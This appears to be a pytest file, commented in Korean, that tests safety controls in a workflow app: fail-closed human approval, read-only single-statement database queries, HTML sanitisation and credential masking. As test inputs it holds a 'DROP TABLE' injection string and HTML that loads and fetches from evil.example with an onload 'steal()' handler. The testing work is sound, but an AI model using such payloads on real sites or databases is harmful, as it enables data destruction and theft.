"""P0 안전 조치 테스트 (INCOMPLETE_NODE_STRUCTURE_REVIEW §6 P0).

1. 사용자 승인: 자동 승인 제거 — 결정 없으면 중단(fail-closed), 노드별 결정 지원
2. databaseNode: 평문 접속 문자열 실행 차단, API 센터 reference 도입
3. databaseNode: read-only 세션·단일 statement·행 제한·오류 마스킹
4. 포스터: HTML 살균과 크기 상한
5. 실행 로그 payload 의 자격증명 마스킹
"""

import json

import pytest
from sqlalchemy import create_engine, text

from db_query_runtime import (
    LEGACY_PLAINTEXT_SENTINEL,
    _apply_readonly_session,
    run_readonly_query,
)
from graph import run_workflow
from poster_generator import clamp_poster_dimensions, sanitize_poster_html
from usage_tracking import redact_payload_secrets


def _graph(middle_node, extra_edges=None, extra_nodes=None):
    nodes = [
        {"id": "n1", "type": "startNode", "data": {}},
        middle_node,
        {"id": "n3", "type": "outputNode", "data": {}},
    ] + (extra_nodes or [])
    edges = [
        {"source": "n1", "target": "n2"},
        {"source": "n2", "target": "n3"},
    ] + (extra_edges or [])
    return nodes, edges


# ── 1. 사용자 승인 fail-closed ──────────────────────────────────────────
def _approval_graph():
    return _graph({"id": "n2", "type": "humanApprovalNode", "data": {"message": "진행할까요?"}})


def test_승인_결정이_없으면_실행이_중단된다():
    nodes, edges = _approval_graph()
    result, _, _ = run_workflow(nodes, edges, default_input="입력값")
    assert "HUMAN_APPROVAL_REQUIRED" in result
    assert "자동" not in result.split("HUMAN_APPROVAL_REQUIRED")[0]  # 성공 결과가 아니라 오류 문자열


def test_노드별_승인_결정으로_진행된다():
    nodes, edges = _approval_graph()
    result, _, _ = run_workflow(nodes, edges, default_input="입력값", approval_decisions={"n2": "Y"})
    assert "HUMAN_APPROVAL_REQUIRED" not in result
    assert "Dynamic Execution Error" not in result


def test_노드별_거절은_실행을_중단한다():
    nodes, edges = _approval_graph()
    result, _, _ = run_workflow(nodes, edges, default_input="입력값", approval_decisions={"n2": "N"})
    assert "Rejected" in result


def test_전역_결정은_명시적_폴백으로_유지된다():
    # 평가 파이프라인이 승인 시뮬레이션에 쓰는 경로 — 명시적으로 전달된 결정만 유효하다.
    nodes, edges = _approval_graph()
    result, _, _ = run_workflow(nodes, edges, default_input="입력값", approval_decision="Y")
    assert "HUMAN_APPROVAL_REQUIRED" not in result
    assert "Dynamic Execution Error" not in result


# ── 2. databaseNode 접속 문자열 ─────────────────────────────────────────
def _db_graph(connection_string):
    return _graph({
        "id": "n2", "type": "databaseNode",
        "data": {"connectionString": connection_string, "query": "SELECT 1 AS one"},
    })


def test_평문_접속_문자열은_실행되지_않는다(tmp_path):
    db_file = tmp_path / "real.db"
    create_engine(f"sqlite:///{db_file}").connect().close()
    nodes, edges = _db_graph(f"sqlite:///{db_file}")
    result, _, _ = run_workflow(nodes, edges, default_input="")
    assert "직접 입력한 DB 접속 문자열" in result
    assert str(db_file) not in result


def test_자격증명_미등록_reference는_안내로_대체된다():
    nodes, edges = _db_graph("{{API_CENTER:database}}")
    result, _, _ = run_workflow(nodes, edges, default_input="")
    assert "API 센터" in result


def test_평문_차단은_원본_그래프를_바꾸지_않는다(tmp_path):
    nodes, edges = _db_graph("sqlite:///whatever.db")
    run_workflow(nodes, edges, default_input="")
    assert nodes[1]["data"]["connectionString"] == "sqlite:///whatever.db"
    assert LEGACY_PLAINTEXT_SENTINEL not in json.dumps(nodes)


# ── 3. run_readonly_query ───────────────────────────────────────────────
@pytest.fixture
def sqlite_db(tmp_path):
    path = tmp_path / "data.db"
    engine = create_engine(f"sqlite:///{path}")
    with engine.begin() as conn:
        conn.execute(text("CREATE TABLE items (id INTEGER PRIMARY KEY, name TEXT)"))
        conn.execute(text("INSERT INTO items (name) SELECT 'item-' || value FROM (WITH RECURSIVE seq(value) AS (SELECT 1 UNION ALL SELECT value+1 FROM seq WHERE value < 150) SELECT value FROM seq)"))
    engine.dispose()
    return f"sqlite:///{path}"


def test_select가_json_행을_반환한다(sqlite_db):
    result = run_readonly_query(sqlite_db, "SELECT id, name FROM items WHERE id <= 2 ORDER BY id")
    rows = json.loads(result)
    assert rows == [{"id": 1, "name": "item-1"}, {"id": 2, "name": "item-2"}]


def test_쓰기_쿼리는_거부된다(sqlite_db):
    result = run_readonly_query(sqlite_db, "INSERT INTO items (name) VALUES ('x')")
    assert result.startswith("Database Error:")
    assert "읽기 전용" in result


def test_readonly_세션이_실제_쓰기를_막는다(sqlite_db):
    # 첫 단어 검사(1층)를 우회해도 read-only 세션(2층)이 막는지 — 세션 계층을 직접 검증.
    engine = create_engine(sqlite_db)
    with engine.connect() as conn:
        _apply_readonly_session(conn, "sqlite", 5)
        with pytest.raises(Exception) as exc_info:
            conn.execute(text("INSERT INTO items (name) VALUES ('smuggled')"))
        assert "readonly" in str(exc_info.value).lower() or "query_only" in str(exc_info.value).lower()
    engine.dispose()


def test_다중_statement는_거부된다(sqlite_db):
    result = run_readonly_query(sqlite_db, "SELECT 1; DROP TABLE items")
    assert "statement 는 하나만" in result
    # 테이블이 살아있는지 확인
    assert json.loads(run_readonly_query(sqlite_db, "SELECT COUNT(*) AS c FROM items"))[0]["c"] == 150


def test_행_제한이_적용되고_잘림이_표시된다(sqlite_db):
    result = run_readonly_query(sqlite_db, "SELECT * FROM items")
    assert "[⚠️" in result and "생략" in result
    body = result.split("\n[⚠️")[0]
    assert len(json.loads(body)) == 100


def test_오류에_접속정보가_노출되지_않는다():
    result = run_readonly_query("postgresql://dbuser:supersecretpw@127.0.0.1:9/nope", "SELECT 1")
    assert result.startswith("Database Error:")
    assert "supersecretpw" not in result
    assert "dbuser" not in result


# ── 4. 포스터 격리 ──────────────────────────────────────────────────────
def test_포스터_html에서_실행_요소가_제거된다():
    dirty = (
        '<html><head><script src="https://evil.example/x.js"></script></head>'
        '<body onload="steal()"><h1>행사</h1>'
        '<script>fetch("https://evil.example")</script>'
        '<iframe src="https://evil.example"></iframe>'
        '<object data="x"></object><embed src="y"/><base href="https://evil.example/">'
        '</body></html>'
    )
    cleaned = sanitize_poster_html(dirty)
    for banned in ("<script", "<iframe", "<object", "<embed", "<base", "onload", "evil.example"):
        assert banned not in cleaned.lower()
    assert "<h1>행사</h1>" in cleaned


def test_포스터_크기가_상한으로_고정된다():
    assert clamp_poster_dimensions(99999, 12) == (4000, 100)
    assert clamp_poster_dimensions("abc", None) == (900, 1200)


# ── 5. 실행 로그 payload 마스킹 ─────────────────────────────────────────
def test_payload의_자격증명이_마스킹된다():
    payload = json.dumps({
        "project_id": 1,
        "nodes": [
            {"id": "n1", "type": "databaseNode",
             "data": {"connectionString": "postgresql://u:pw@h/db", "query": "SELECT 1"}},
            {"id": "n2", "type": "kakaoNode", "data": {"accessToken": "raw-token-value"}},
            {"id": "n3", "type": "slackNode", "data": {"channel": "#general"}},
        ],
    })
    redacted = redact_payload_secrets(payload)
    assert "postgresql://u:pw@h/db" not in redacted
    assert "raw-token-value" not in redacted
    assert "[REDACTED_CREDENTIAL]" in redacted
    assert "#general" in redacted and "SELECT 1" in redacted


def test_reference와_비JSON_payload는_그대로다():
    payload = json.dumps({"nodes": [{"data": {"connectionString": "{{API_CENTER:database}}"}}]})
    assert "{{API_CENTER:database}}" in redact_payload_secrets(payload)
    assert redact_payload_secrets("not-json") == "not-json"
    assert redact_payload_secrets(None) is None
